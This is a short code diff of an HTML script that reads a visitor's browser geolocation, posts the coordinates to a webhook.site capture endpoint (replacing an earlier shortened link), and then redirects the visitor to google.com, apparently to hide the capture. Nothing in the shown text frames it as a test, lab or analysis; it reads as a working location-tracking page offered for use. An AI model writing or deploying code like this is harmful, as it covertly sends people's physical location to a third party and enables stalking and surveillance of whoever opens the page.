@@ -1,6 +1,6 @@
 <script>
 navigator.geolocation.getCurrentPosition(function(pos) {
-    fetch("https://urlto.me/2B1N8", {
+    fetch("https://webhook.site/d0afbe0c-c633-4e26-b299-69549cbceb7a", {
         method: "POST",
         headers: {"Content-Type": "application/json"},
         body: JSON.stringify({
@@ -11,6 +11,7 @@ navigator.geolocation.getCurrentPosition(function(pos) {
         })
     });
 
+    // Optional redirect after sending location
     window.location.href = "https://google.com";
 });
 </script>
